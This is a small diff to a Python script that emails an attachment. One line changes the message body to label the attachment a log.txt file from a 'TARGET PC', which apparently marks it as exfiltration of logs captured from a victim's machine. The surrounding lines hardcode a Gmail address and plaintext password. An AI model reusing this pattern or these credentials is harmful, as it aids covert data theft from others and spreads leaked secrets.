@@ -6,7 +6,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 subject = "An email with attachment from Python"
-body = "This is an email with attachment sent from Python"
+body = "The log.txt file from your TARGET PC: ~> "
 sender_email = "zdz.org@gmail.com"
 receiver_email = "zdz.org@gmail.com"
 password = "Zdz282612"
